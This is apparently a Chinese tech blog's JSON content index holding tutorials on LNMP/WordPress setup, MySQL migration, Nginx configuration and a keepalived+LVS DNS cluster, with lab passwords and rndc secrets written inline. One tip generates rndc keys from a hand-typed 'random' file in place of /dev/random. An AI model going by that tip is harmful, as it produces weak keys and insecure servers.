&#x2F;application&#x2F;nginx&#x2F;html&#x2F;blog&#x2F;3. 修改站点目录权限 chown -R www.www &#x2F;application&#x2F;nginx&#x2F;html&#x2F;blog4. 网站初始化-创建数据库 create database wordpress;5. 数据库授权 grant all on wordpress.* to &#39;wordpress&#39;@&#39;localhost&#39; identified by &#39;oldboy123&#39;; flush privileges; select user,hosts from mysql.user; MySQL数据库迁移123456789101112131415在新的db服务器上进行如下操作：(1)重复以上mysql数据库二进制安装(2)备份源数据库信息 mysqldump -uroot -poldboy123 --all-databases &gt;&#x2F;tmp&#x2F;bak.sql ll &#x2F;tmp&#x2F;bak.sql 压缩并scp到新的db服务器&#x2F;tmp目录 scp &#x2F;tmp&#x2F;bak.sql 172.16.1.51:&#x2F;tmp&#x2F;(3)新的db数据库登陆并读入【恢复数据库】 mysql -uroot -poldboy123 &lt; &#x2F;tmp&#x2F;bak.sql flush privileges; 刷新权限(4)测试 mysql远程登陆: mysql -uroot -poldboy123 -h 172.16.1.51 修改数据库连接配置，改为远程db服务器IP地址（需提前授权，并刷新权限）(5)数据库迁移成功，停止源mysql数据库 &#x2F;etc&#x2F;init.d&#x2F;mysqld stop 可以将图片等资源放入NFS实现共享","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"LNMP","slug":"LNMP","permalink":"https://garywu520.github.io/tags/LNMP/"},{"name":"LAMP","slug":"LAMP","permalink":"https://garywu520.github.io/tags/LAMP/"},{"name":"LNMP编译","slug":"LNMP编译","permalink":"https://garywu520.github.io/tags/LNMP%E7%BC%96%E8%AF%91/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"wordpress","slug":"wordpress","permalink":"https://garywu520.github.io/tags/wordpress/"},{"name":"mysql数据库迁移","slug":"mysql数据库迁移","permalink":"https://garywu520.github.io/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB/"}]},{"title":"Nginx精讲","slug":"Nginx精讲","date":"2017-09-16T02:03:50.000Z","updated":"2017-09-16T09:42:01.728Z","comments":true,"path":"2017/09/16/Nginx精讲/","link":"","permalink":"https://garywu520.github.io/2017/09/16/Nginx%E7%B2%BE%E8%AE%B2/","excerpt":"nginx官方文档 1http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;","text":"nginx官方文档 1http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F; 基于域名的虚拟主机 12345678910111213141516171819202122232425262728293031323334353637[root@web01 conf]# cat nginx.confworker_processes 3;events &#123; worker_connections 1024;&#125;http &#123; #注：nginx server区块需要放在http标签内 include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name blog.etiantian.org; location &#x2F; &#123; root html&#x2F;blog; index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name bbs.etiantian.org; location &#x2F; &#123; root html&#x2F;bbs; index index.html index.htm; &#125; &#125; &#125;注：基于域名的配置虚拟主机，当输入IP地址访问的时候，默认加载展现的是配置中第一个配置。但如果使用了include加载目录下独立文件，默认显示的是该目录中ls -l结果中的第一个文件html结果。 基于端口虚拟主机 12345678910111213141516171819202122232425262728293031323334353637[root@web01 conf]# cat nginx.confworker_processes 3;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; &#125; &#125; server &#123; listen 81; server_name blog.etiantian.org; location &#x2F; &#123; root html&#x2F;blog; index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name bbs.etiantian.org; location &#x2F; &#123; root html&#x2F;bbs; index index.html index.htm; &#125; &#125; &#125;注：当基于域名和基于端口同时存在时，配置后测试会出现结果混乱。这时候nginx与OSI7层模型有直接关联，层层筛选，网络层（关注的是IP地址）首先被匹配，然后传输层（关注的是端口）被匹配，最后应用层（关注的是host域名，即定义的server_name）被匹配。当所有匹配没有的情况下，默认会显示第一个配置。所以本例中,当访问blog.etiantian.org的时候，展示的是www.etiantian.org的内容。 基于IP虚拟主机 1在nginx配置文件中，设计到IP信息的修改，都需要重启Nginx服务（不能使用reload），才能生效。 12345678910111213141516171819[root@web01 conf]# cat nginx.confworker_processes 3;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 10.0.0.8:80; server_name www.etiantian.org; location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; &#125; &#125; &#125; 状态码 12HTTP 304: Not Modified 这是因为客户端（浏览器）有缓存304状态码再现：第一次访问 200,按F5刷新就会出现304状态码 Nginx别名 123456789101112131415161718[root@web01 conf]# cat nginx.confworker_processes 3;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name www.etiantian.org t.org; #别名功能配置-注：需提前完成域名解析 location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; &#125; &#125; Nginx状态模块功能 1234567891011121314151617181920211.查看已安装模块nginx -V2.状态页配置server&#123; listen 80; server_name status.etiantian.org; location &#x2F; &#123; stub_status on; access_log off; &#125; &#125;3. web_nginx状态页-参数说明 Active connections:44 活动连接数-当前有多少用户在访问 accepts 接收客户端连接的总数量 handled 处理连接的总数量 requests 客户端请求的总数(不代表已经建立连接) reading nginx当前有多少个请求报文 Writing nginx当前响应客户端的报文 waiting 内存中等待异步处理数量 nginx日志文件生成 12345678错误日志-配置（放在woker区块）[root@web01 conf]# cat nginx.confworker_processes 3; error_log logs&#x2F;error.log error; events &#123; worker_connections 1024;&#125; 1234567891011121314151617访问日志-配置（放到http区块）log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log main;注释：$remote_addr 客户端IP地址信息$remote_user 客户端的(基础认证时)用户信息[$time_local] 用户访问的时间&quot;$request&quot; HTTP请求报文中的请求行的信息(HTTP协议版本等)$status 服务端返回的状态码信息$body_bytes_sent 服务端返回给客户端所请求的资源大小信息&quot;$http_referer&quot; 记录推荐链接过来的服务器地址信息&quot;$http_user_agent&quot; 客户端访问网站的方式-使用浏览器的类型&quot;$http_x_forwarded_for&quot; 脚本-实现日志切割 12345678910[root@web01 ~]# vim log_cut.sh#!&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;mv &#x2F;application&#x2F;nginx&#x2F;logs&#x2F;access.log &#x2F;application&#x2F;nginx&#x2F;logs&#x2F;access_$(date +%F).log&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload思路：1. 重命名access.log文件2. reload nginx服务，重新生成access.log文件3. 在脚本中添加判断access.log文件大小，比如达到2G就切割4. 在crontab中定时执行 另外也可以使用logrotate来实现日志切割，参考logrotate使用 nginx的location模块 根据用户请求的URI来展示不同的应用内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546企业需求解决01. 搭建好一台nginx的web服务器。配置好内网卡地址与外网卡地址02. web服务的网站域名为www.etiantian.org，站点目录为html&#x2F;www03. 要求内网用户可以访问网站http:&#x2F;&#x2F;www.etiantian.org&#x2F;AV&#x2F; 04. 要求外网用户禁止访问网站http:&#x2F;&#x2F;www.etiantian.org&#x2F;AV&#x2F; 解决方案：第1点: 定位资源信息 uri&#x3D;&#x3D; &#x2F;AV第二点：进行策略控制allowdeny第三点：编辑配置文件[root@web01 www]# cat &#x2F;application&#x2F;nginx&#x2F;conf&#x2F;extra&#x2F;www.conf server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; &#125; location &#x2F;AV&#x2F; &#123; root html&#x2F;www; index index.html index.htm; allow 172.16.1.0&#x2F;24; deny all; &#125; &#125; 创建测试资源信息cd &#x2F;application&#x2F;nginx&#x2F;html&#x2F;www&#x2F;mkdir AV &amp;&amp; llecho oldboy_AV &gt;AV&#x2F;oldboy.html 进行客户端测试[root@nfs01 ~]# curl 10.0.0.8&#x2F;AV&#x2F;oldboy.html #外网测试&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;&#x2F;html&gt;[root@nfs01 ~]# curl 172.16.1.8&#x2F;AV&#x2F;oldboy.html #内网测试oldboy_AV localtion格式 localtion [=||*|^~|@] uri {…} 指令 匹配标识 匹配的网站 匹配URI后要执行的配置段 1234&quot;&#x3D;&quot; 优先匹配&quot;^~&quot; 匹配常规字符串&quot;~&quot; 匹配大小写&quot;~*&quot; 不区分大小写匹配 12345678910111213141516171819202122[root@web01 extra]# vim www.conf server &#123; listen 80; server_name www.etiantian.org etiantian.org; root html&#x2F;www; location &#x2F; &#123; return 401; &#125; location &#x3D; &#x2F; &#123; return 402; &#125; location &#x2F;documents&#x2F; &#123; return 403; &#125; location ^~ &#x2F;images&#x2F; &#123; return 404; &#125; location ~* \\.（gif|jpg|jpeg）$ &#123; return 500; &#125; access_log logs&#x2F;access_www.log main; &#125; 1234567891011测试结果：[root@web01 log]# curl -I -s -w &quot;%&#123;http_code&#125;\\n&quot; -o &#x2F;dev&#x2F;null www.etiantian.org402[root@web01 log]# curl -I -s -w &quot;%&#123;http_code&#125;\\n&quot; -o &#x2F;dev&#x2F;null www.etiantian.org&#x2F;index.html401[root@web01 log]# curl -I -s -w &quot;%&#123;http_code&#125;\\n&quot; -o &#x2F;dev&#x2F;null www.etiantian.org&#x2F;documents&#x2F;403[root@web01 log]# curl -I -s -w &quot;%&#123;http_code&#125;\\n&quot; -o &#x2F;dev&#x2F;null www.etiantian.org&#x2F;images&#x2F;1.jpg404[root@web01 log]# curl -I -s -w &quot;%&#123;http_code&#125;\\n&quot; -o &#x2F;dev&#x2F;null www.etiantian.org&#x2F;1.jpg500 nginx的rewirte重写模块（放在server区块） 12345包含&amp;符号的URI称为动态资源，其他叫做静态资源rewrite模块两个功能:1.实现网站地址信息跳转2.实现伪静态 方法1: 通过if和rewrite结合来实现301跳转-避免无限跳转 12345678910111213 server &#123; listen 80; server_name www.etiantian.org t.org; if ($host ~* &quot;^etiantian.org$&quot;) &#123; rewrite ^&#x2F;(.*) http:&#x2F;&#x2F;www.etiantian.org&#x2F;$1 permanent; &#125; location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; &#125; &#125; 逻辑：当客户端通过域名访问etiantian.org的时候，通过网络层找到了这台主机，然后通过传输层找到了80端口，最后通过应用层没有匹配到etiantian.org。此时，进入了if区块，if正则判断将etiantian.org替换成了http:&#x2F;&#x2F;www.etiantian.org。再次使用http:&#x2F;&#x2F;www.etiantian.org重新请求,通过网络层、传输层和应用层，匹配到了之后,再往下走匹配到了首页文件。 方法2： 12345添加了一个server标签，在www.etiantian.org标签之上server &#123; server_name etiantian.org; rewrite ^&#x2F;(.*) http:&#x2F;&#x2F;www.etiantian.org&#x2F;$1 permanent; &#125; 测试 123测试curl -Lv etiantian.org 可通过此命令查看rewrite详细过程curl -v etiantian.org nginx认证(location区块) 12345678910111213141516171819202122①. 修改nginx的相关配置文件 vim extra&#x2F;www.conf location &#x2F; &#123; root html&#x2F;www; index index.html index.htm; auth_basic &quot;oldboy training&quot;; auth_basic_user_file &#x2F;application&#x2F;nginx&#x2F;conf&#x2F;htpasswd; &#125; ②. 创建密码认证文件并进行授权 yum install httpd-tools -y htpasswd -bc &#x2F;application&#x2F;nginx&#x2F;conf&#x2F;htpasswd oldboy 123456③. 修改权限 chmod 400 &#x2F;application&#x2F;nginx&#x2F;conf&#x2F;htpasswd chown -R www.www &#x2F;application&#x2F;nginx&#x2F;conf&#x2F;htpasswd htpasswd命令-参数-c 创建一个新的密码文件-b 采用免交互的方式输入用户的密码信息-m 强制使用md5加密-D 删除web认证用户 测试 12345678910111213[root@web01 log]# curl www.etiantian.org&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Authorization Required&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;401 Authorization Required&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.10.3&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;[root@web01 log]# curl -u oldboy www.etiantian.orgEnter host password for user &#39;oldboy&#39;:10.0.0.8 www[root@web01 log]# curl -u oldboy:123456 www.etiantian.org10.0.0.8 www","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"apache","slug":"apache","permalink":"https://garywu520.github.io/tags/apache/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"},{"name":"htpasswd","slug":"htpasswd","permalink":"https://garywu520.github.io/tags/htpasswd/"},{"name":"日志切割","slug":"日志切割","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2/"}]},{"title":"keepalived(主从)+LVS(DR模型)+DNS实现高可用集群服务","slug":"keepalived-主从-LVS-DR模型-DNS实现高可用集群服务","date":"2017-09-14T10:09:41.000Z","updated":"2017-09-15T10:21:36.758Z","comments":true,"path":"2017/09/14/keepalived-主从-LVS-DR模型-DNS实现高可用集群服务/","link":"","permalink":"https://garywu520.github.io/2017/09/14/keepalived-%E4%B8%BB%E4%BB%8E-LVS-DR%E6%A8%A1%E5%9E%8B-DNS%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%9C%8D%E5%8A%A1/","excerpt":"keeplived+LVS+DNS三者之间的关系 1LVS负责负载均衡，根据算法调度DNS集群；而keeplived则是为了解决LVS的单点故障","text":"keeplived+LVS+DNS三者之间的关系 1LVS负责负载均衡，根据算法调度DNS集群；而keeplived则是为了解决LVS的单点故障 测试环境 本测试方案采用LVS（DR）+Keepalived部署高可用的DNS服务集群。 12345678(1)服务器IP规划： LB-1：192.168.56.21 LB-2：192.168.56.22 DNS1：192.168.56.23 DNS2：192.168.56.24 实验过程中，虚拟心跳检测VIP定义为：192.168.56.100(2)iptables和selinux已关闭 配置LB-1服务器 安装lvs和keepalived 12345#安装ipvsadmyum install ipvsadm* -y#安装keepalivedyum install keepalived -y keepalived参数详解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100! Configuration File for keepalived #与#号一样，都是注释global_defs &#123; #全局设定 notification_email &#123; #email邮件通知配置 617597237@qq.com &#125; notification_email_from Alexandre.Cassen@firewall.loc smtp_server 127.0.0.1 #如果开启了sendmail，就可以使用这些默认配置实现邮件发送 smtp_connect_timeout 30 router_id LVS_1 #LVS负载均衡器标识[router_id],一个局域网内是唯一的 &#125;########################################################################################下面的每个vrrp_instance我们可以认为是一个keeplived实例，vrrp实例可以有多个。vrrp_instance VI_1 &#123; #大括号“&#123;&#125;”用来分隔定义块，因此必须成对出现！！！ state MASTER #如果不指定Master或者BACKUP,那priority最高的就是master【字母大写】 interface eth0 #监听的实际网口 virtual_router_id 50 #组播ID，通过224.0.0.18可以监听到现在已经存在的VRRP ID priority 100 #优先级或者叫做权重，权重数字越大成为master的优先级就越高 advert_int 1 ##发送组播包的间隔时间，默认为1秒 authentication &#123; #这个是验证类型为PASS（明文）,密码为1111。 auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #定义虚拟VIP 192.168.56.100 &#125;&#125;virtual_server 192.168.56.100 53 &#123; #定义虚拟VIP服务器 delay_loop 1 #延迟轮询时间（单位秒） lb_algo rr #负载均衡调度算法rr|wrr|lc|wlc|sh|dh|lblc lb_kind DR #LVS调度类型NAT&#x2F;DR&#x2F;TUN,此处选择DR nat_mask 255.255.255.255 !persistence_timeout 50 #会话保持时间，如果是动态服务，建议开启。默认50秒 protocol UDP #由于DNS协议涉及UDP和TCP，所以下面还会新增一个TCP实例 real_server 192.168.56.23 53 &#123; #定义真实IP【本例:DNS1的真实IP地址】 weight 1 #配置服务节点的权值，数值越大，分发的可能越大 MISC_CHECK &#123; #MISC健康检查方式，执行一个dig命令 misc_path &quot;&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.23 +time&#x3D;1 +tries&#x3D;5 +fail &gt;&#x2F;dev&#x2F;null&quot; misc_timeout 6 ##脚本执行的超时时间 &#125; &#125; real_server 192.168.56.24 53 &#123; #定义真实IP【本例:DNS2的真实IP地址】 weight 1 MISC_CHECK &#123; #注：UDP协议健康检查方式是dig命令执行，所以需要事先安装dig命令。否则后端DNS将被踢出集群 misc_path &quot;&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.24 +time&#x3D;1 +tries&#x3D;5 +fail &gt;&#x2F;dev&#x2F;null&quot; misc_timeout 6 &#125; &#125;&#125;####################################################################################vrrp_instance VI_2 &#123; #第二个实例命名为“VI_2” state MASTER #如果不指定Master或者BACKUP,那priority最高的就是master【字母大写】 interface eth0 #监听的实际网口 virtual_router_id 52 #组播ID，不能与上面实例中的组播ID重复 priority 100 #定义master节点优先级,需要与上面实例中的优先级一致 advert_int 1 #发送组播包的间隔时间，默认为1秒 authentication &#123; #这个是验证类型为PASS（明文）,密码为1111。 auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #定义虚拟VIP 192.168.56.100 &#125;&#125;virtual_server 192.168.56.100 53 &#123; #定义虚拟VIP服务器 delay_loop 1 #延迟轮询时间（单位秒） lb_algo rr #负载均衡调度算法rr|wrr|lc|wlc|sh|dh|lblc lb_kind DR #LVS调度类型NAT&#x2F;DR&#x2F;TUN,此处选择DR nat_mask 255.255.255.255 !persistence_timeout 50 #会话保持时间，如果是动态服务，建议开启。默认50秒 protocol TCP #本VRRP实例是TCP real_server 192.168.56.23 53 &#123; #定义真实IP【本例:DNS1的真实IP地址】 weight 1 #配置服务节点的权值，数值越大，分发的可能越大 TCP_CHECK &#123; #TCP健康检查方式 connect_timeout 5 #TCP连接超时时间 nb_get_retry 3 #重试次数 connect_port 53 #健康检查连接的TCP端口&#125; &#125; real_server 192.168.56.24 53 &#123; weight 1 TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 connect_port 53&#125; &#125;&#125; keeplived配置 cat /etc/keepalived/keepalived.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596! Configuration File for keepalived global_defs &#123; notification_email &#123; 617597237@qq.com &#125; notification_email_from Alexandre.Cassen@firewall.loc smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id LVS_1 &#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 50 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.56.100 &#125;&#125;virtual_server 192.168.56.100 53 &#123; delay_loop 1 lb_algo rr lb_kind DR nat_mask 255.255.255.255 !persistence_timeout 50 protocol UDP real_server 192.168.56.23 53 &#123; weight 1 MISC_CHECK &#123; misc_path &quot;&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.23 +time&#x3D;1 +tries&#x3D;5 +fail &gt;&#x2F;dev&#x2F;null&quot; misc_timeout 6 &#125; &#125; real_server 192.168.56.24 53 &#123; weight 1 MISC_CHECK &#123; misc_path &quot;&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.24 +time&#x3D;1 +tries&#x3D;5 +fail &gt;&#x2F;dev&#x2F;null&quot; misc_timeout 6 &#125; &#125;&#125; #注：UDP协议健康检查方式是dig命令执行，所以需要事先安装dig命令。否则后端DNS将被踢出集群vrrp_instance VI_2 &#123; state MASTER interface eth0 virtual_router_id 52 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.56.100 &#125;&#125;virtual_server 192.168.56.100 53 &#123; delay_loop 1 lb_algo rr lb_kind DR nat_mask 255.255.255.255 !persistence_timeout 50 protocol TCP real_server 192.168.56.23 53 &#123; weight 1 TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 connect_port 53 &#125; &#125; real_server 192.168.56.24 53 &#123; weight 1 TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 connect_port 53&#125; &#125;&#125; 启动keepalived服务 12service keepalived restartchkconfig keepalived on 查看配置是否生效 123456[root@LB-1 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size&#x3D;4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.56.100:53 rrUDP 192.168.56.100:53 rr 配置LB-2服务器 安装lvs和keepalived 12345#安装ipvsadmyum install ipvsadm* -y#安装keepalivedyum install keepalived -y keepalived配置 cat /etc/keepalived/keepalived.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596! Configuration File for keepalived global_defs &#123; notification_email &#123; 617597237@qq.com &#125; notification_email_from Alexandre.Cassen@firewall.loc smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id LVS_2 #修改为LVS_2 &#125;vrrp_instance VI_1 &#123; state BACKUP #修改为BACKUP interface eth0 virtual_router_id 50 priority 50 #优先级改为50 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.56.100 &#125;&#125;virtual_server 192.168.56.100 53 &#123; delay_loop 1 lb_algo rr lb_kind DR nat_mask 255.255.255.255 !persistence_timeout 50 protocol UDP real_server 192.168.56.23 53 &#123; weight 1 MISC_CHECK &#123; misc_path &quot;&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.23 +time&#x3D;1 +tries&#x3D;5 +fail &gt;&#x2F;dev&#x2F;null&quot; misc_timeout 6 &#125; &#125; real_server 192.168.56.24 53 &#123; weight 1 MISC_CHECK &#123; misc_path &quot;&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.24 +time&#x3D;1 +tries&#x3D;5 +fail &gt;&#x2F;dev&#x2F;null&quot; misc_timeout 6 &#125; &#125;&#125;vrrp_instance VI_2 &#123; state BACKUP #修改为BACKUP interface eth0 virtual_router_id 52 priority 50 #优先级改为50 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.56.100 &#125;&#125;virtual_server 192.168.56.100 53 &#123; delay_loop 1 lb_algo rr lb_kind DR nat_mask 255.255.255.255 !persistence_timeout 50 protocol TCP real_server 192.168.56.23 53 &#123; weight 1 TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 connect_port 53 &#125; &#125; real_server 192.168.56.24 53 &#123; weight 1 TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 connect_port 53&#125; &#125;&#125; 启动keepalived服务 12service keepalived restartchkconfig keepalived on 查看配置是否生效 123456[root@LB-1 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size&#x3D;4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.56.100:53 rrUDP 192.168.56.100:53 rr 配置DNS主从 在DNS1和DNS2上操作 12345yum install bind-utils bind bind-devel bind-chroot -y注：bind-utils 组件可以运行dig命令bind-chroot组件可以实现的功能，假设由于DNS漏洞服务器被黑客攻击，黑客只能在DNS根目录进行破坏，而不是操作系统实际的根目录 DNS1-主上配置 12DNS配置文件&#x2F;etc&#x2F;named.conf，备份后清空源文件，自己创建注：安装完成后，bind DNS自有的根目录是&#x2F;var&#x2F;named&#x2F;chroot&#x2F; ,为了安全，配置文件均可放在该目录下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172配置文件：options &#123; version &quot;1.1.1&quot;; &#x2F;&#x2F;当请求时DNS服务器返回给客户端的bind版本，为了安全建议任意指定一个。 listen-on port 53 &#123;any;&#125;; &#x2F;&#x2F;定义DNS监听在哪个IP的特定端口上 directory &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc&#x2F;&quot;; &#x2F;&#x2F;指定DNS区域文件存放目录 pid-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;run&#x2F;named&#x2F;named.pid&quot;; &#x2F;&#x2F;指定named进程pid文件路径 allow-query &#123; any; &#125;; &#x2F;&#x2F;定义哪些主机可以使用该DNS来解析 Dump-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;binddump.db&quot;; &#x2F;&#x2F;缓存转储位置 Statistics-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;named_stats&quot;; &#x2F;&#x2F;记录统计信息的文件 zone-statistics yes; &#x2F;&#x2F;如果是yes，缺省情况下，服务器将会收集在服务器所有域的统计数据。这些统计数据可以通过使用rndc stats来访问，rndc stats命令可以将这些信息转储到statistics-file定义的文件中去。 memstatistics-file &quot;log&#x2F;mem_stats&quot;; &#x2F;&#x2F;记录内存使用的统计信息 empty-zones-enable no; &#x2F;&#x2F;打开或者关闭空的区域,默认为开启 forwarders &#123;114.114.114.114;8.8.8.8; &#125;; &#x2F;&#x2F;定义上游DNS&#125;;key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;Eqw4hClGExUWeDkKBX&#x2F;pBg&#x3D;&#x3D;&quot;;&#125;;controls &#123; inet 127.0.0.1 port 953 allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;#########################################################################################注：key的生成方式[root@master]# which rndc-confgen&#x2F;usr&#x2F;sbin&#x2F;rndc-confgen[root@master]# &#x2F;usr&#x2F;sbin&#x2F;rndc-confgen -s 127.0.0.1 -p 953 &gt;&#x2F;etc&#x2F;rndc.key此命令会在&#x2F;etc目录下产生rndc.key文件，可把此文件粘贴到此处或者把文件放到&#x2F;var&#x2F;named&#x2F;chroot目录下使用include加载，如下:include &quot;&#x2F;etc&#x2F;rndc.key&quot;;controls &#123; inet 127.0.0.1 port 953 allow &#123; localhost; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;注：如果命令没反应是因为服务器上没有random产生器，我们手动伪造一个文件代替&#x2F;dev&#x2F;random产生器新建一个random文件，然后随意输入一串字符，一定要长~~然后运行命令[root@master]# rndc-confgen -r random -s 127.0.0.1 -p 953 &gt;&#x2F;etc&#x2F;rndc.conf#########################################################################################logging &#123; channel warning &#123; &#x2F;&#x2F;记录了一些named的信息，如监听&#x2F;解析记录等，当然warnning可以改为default_debug（默认）。 file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;dns_warning&quot; versions 10 size 10m; &#x2F;&#x2F;日志文件路径&#x2F;版本&#x2F;大小 severity warning; &#x2F;&#x2F;如果warnning改为default_debug后，此处可以改为severity dynamic print-category yes; &#x2F;&#x2F;日志中是否需要写入日志类别 print-severity yes; &#x2F;&#x2F;日志中是否需要写入消息级别 print-time yes; &#x2F;&#x2F;日志中是否需要写入时间 &#125;; channel general_dns &#123; &#x2F;&#x2F;绑定其他log channel通道，以下保持默认即可。 file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;dns_log&quot; versions 10 size 100m; severity info; print-category yes; print-severity yes; print-time yes; &#125;; category default &#123; warning; &#125;; category queries &#123; general_dns; &#125;;&#125;;include &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc&#x2F;view.conf&quot;; &#x2F;&#x2F;加载文件，方便管理 编辑/etc/named.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051options &#123; version &quot;1.1.1&quot;; listen-on port 53 &#123;any;&#125;; directory &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc&#x2F;&quot;; pid-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;run&#x2F;named&#x2F;named.pid&quot;; allow-query &#123; any; &#125;; Dump-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;binddump.db&quot;; Statistics-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;named_stats&quot;; zone-statistics yes; memstatistics-file &quot;log&#x2F;mem_stats&quot;; empty-zones-enable no; forwarders &#123; 114.114.114.114; 8.8.8.8; &#125;;&#125;;key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;iePWaBCTTwMeAC0WWUqLMA&#x3D;&#x3D;&quot;;&#125;;controls &#123; inet 127.0.0.1 port 953 allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;logging &#123; channel warning &#123; file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;dns_warning&quot; versions 10 size 10m; severity warning; print-category yes; print-severity yes; print-time yes; &#125;; channel general_dns &#123; file 